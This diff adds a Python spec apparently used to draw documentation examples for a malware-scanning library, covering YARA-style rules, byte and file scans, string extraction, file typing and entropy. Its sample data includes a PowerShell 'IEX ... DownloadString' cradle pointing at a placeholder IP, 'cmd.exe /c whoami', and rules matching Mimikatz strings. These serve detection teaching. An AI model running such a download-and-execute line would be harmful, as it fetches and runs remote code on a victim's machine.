@@ -1,0 +1,87 @@
+# Pictures for the scan library (read with ast.literal_eval; never run).
+# Every example runs through TB while the site builds, with scan.example (a
+# small YARA-style rule) and the sample files in apps/data/.
+SPEC = {
+    "_default": {"modes": {"text": "lines", "path": "lines", "dir": "lines", "data": "lines"}},
+    "rule": {
+        "args": {"text": "scan.example"},
+        "mode": "tree",
+        "nodes": [{"param": "text", "icon": "doc", "lines": ["rule SuspiciousDownloader {", "  strings: $a = \"DownloadString\" nocase",
+                                                             "           $b = { 4D 5A ?? 00 }", "  condition: $a and ($b or $c) }"]},
+                  {"arrow": "scan.rule"}, {"result": True, "label": "result · the rule as a map", "mode": "tree"}],
+        "roles": {"text": "one YARA-style rule"},
+    },
+    "rules": {
+        "args": {"text": 'scan.example + "\\nrule Mimikatz { strings: $m = \\"sekurlsa\\" condition: $m }"'},
+        "keys": ["name", "condition"],
+        "nodes": [{"param": "text", "icon": "doc", "lines": ["rule SuspiciousDownloader { ... }", "rule Mimikatz { ... }"]},
+                  {"arrow": "scan.rules"}, {"result": True, "label": "result · one map per rule"}],
+        "roles": {"text": "rule text holding one or more rules"},
+    },
+    "load": {
+        "setup": 'fs.write("rules.yar", scan.example)', "imports": ["fs"],
+        "args": {"path": '"rules.yar"'},
+        "keys": ["name", "condition"],
+        "nodes": [{"param": "path", "icon": "file"}, {"arrow": "scan.load"}, {"result": True, "label": "result · every rule in the file"}],
+        "roles": {"path": "a .yar / .yara rules file"},
+    },
+    "check": {
+        "args": {"rules": "scan.example"},
+        "keys": ["name", "condition"],
+        "nodes": [{"param": "rules", "icon": "doc", "lines": ["rule SuspiciousDownloader { ... }"]}, {"arrow": "scan.check"},
+                  {"result": True, "label": "result · the checked rules (or a clear error)"}],
+        "vary": {"param": "rules", "values": ["scan.example", '"rule Broken { condition: $x }"'], "labels": ["a good rule", "a broken rule"]},
+        "roles": {"rules": "rule text, a rule map or a list"},
+    },
+    "bytes": {
+        "args": {"data": '"MZ\\x90\\0 IEX (New-Object Net.WebClient).DownloadString(\\"http://198.51.100.7/a\\")"', "rules": "scan.example"},
+        "keys": ["rule", "count", "strings"],
+        "nodes": [{"param": "data", "icon": "cpu"}, {"param": "rules", "icon": "shield", "lines": ["SuspiciousDownloader:", "$a and ($b or $c)"]},
+                  {"arrow": "scan.bytes"}, {"result": True, "label": "result · one map per rule that matched", "mode": "tree"}],
+        "roles": {"data": "the bytes (or text) to search", "rules": "rules from rule(), rules() or load(), or rule text"},
+    },
+    "file": {
+        "args": {"path": '"apps/data/sample.pcap"', "rules": "scan.example"},
+        "keys": ["rule", "count", "path"],
+        "nodes": [{"row": [{"param": "path", "icon": "file"}, {"param": "rules", "icon": "shield", "lines": ["SuspiciousDownloader"]}]},
+                  {"arrow": "scan.file"}, {"result": True, "label": "result · matches, each with the path"}],
+        "roles": {"path": "the file whose bytes are scanned", "rules": "the rules to run"},
+    },
+    "folder": {
+        "args": {"dir": '"apps/data"', "rules": "scan.example", "options": '{"recursive": true}'},
+        "keys": ["rule", "path", "count"],
+        "nodes": [{"row": [{"param": "dir", "icon": "folder"}, {"param": "rules", "icon": "shield", "lines": ["SuspiciousDownloader"]}]},
+                  {"param": "options"}, {"arrow": "scan.folder"}, {"result": True, "label": "result · matches from every file"}],
+        "roles": {"dir": "the folder to scan", "rules": "the rules to run", "options": "recursive (true), max_size (32 MB)"},
+    },
+    "strings": {
+        "args": {"data": 'b"\\x00\\x01http://198.51.100.7/a.ps1\\x00\\x02cmd.exe /c whoami\\x00ab"', "min": "4", "limit": "10"},
+        "keys": ["text", "offset"],
+        "nodes": [{"param": "data", "icon": "cpu", "lines": ["00 01 http://198.51.100.7/a.ps1", "00 02 cmd.exe /c whoami 00 ab"]},
+                  {"row": [{"param": "min"}, {"param": "limit"}]},
+                  {"arrow": "scan.strings"}, {"result": True, "label": "result · readable runs, by offset"}],
+        "vary": {"param": "min", "values": ["2", "4", "20"], "default": "4"},
+        "roles": {"data": "bytes, text or a file path", "min": "the shortest run kept (4)", "limit": "at most this many strings"},
+    },
+    "file_type": {
+        "args": {"path": '"apps/data/sample.pcap"'},
+        "keys": ["type", "description", "mime", "executable"],
+        "nodes": [{"param": "path", "icon": "file"}, {"box": "magic bytes", "kind": "plain", "lines": ["looks at the first bytes,", "not the name"]},
+                  {"arrow": "scan.file_type"}, {"result": True}],
+        "vary": {"param": "path", "values": ['"apps/data/sample.pcap"', '"apps/data/sample.evtx"', '"notes.txt"'],
+                 "labels": ["sample.pcap", "sample.evtx", "notes.txt"]},
+        "roles": {"path": "the file to identify"},
+    },
+    "entropy": {
+        "args": {"data": '"aaaa"'},
+        "vary": {"param": "data", "values": ['"aaaa"', '"hello world"', '"apps/data/sample.pcap"'], "labels": ["aaaa", "hello world", "sample.pcap (a path)"]},
+        "roles": {"data": "bytes, text or a file path: 0 is all the same, 8 is random"},
+    },
+    "interesting": {
+        "args": {"strings": 'scan.strings("http://198.51.100.7/a.ps1 HKLM\\\\Software\\\\Run kernel32.dll")', "limit": "5"},
+        "mode": "tree",
+        "nodes": [{"param": "strings", "icon": "list", "lines": ["strings from scan.strings(...):", "http://198.51.100.7/a.ps1 HKLM\\Software\\Run", "kernel32.dll"]},
+                  {"param": "limit"}, {"arrow": "scan.interesting"}, {"result": True, "label": "result · sorted into what analysts look for", "mode": "tree"}],
+        "roles": {"strings": "strings from scan.strings()", "limit": "at most this many per kind"},
+    },
+}
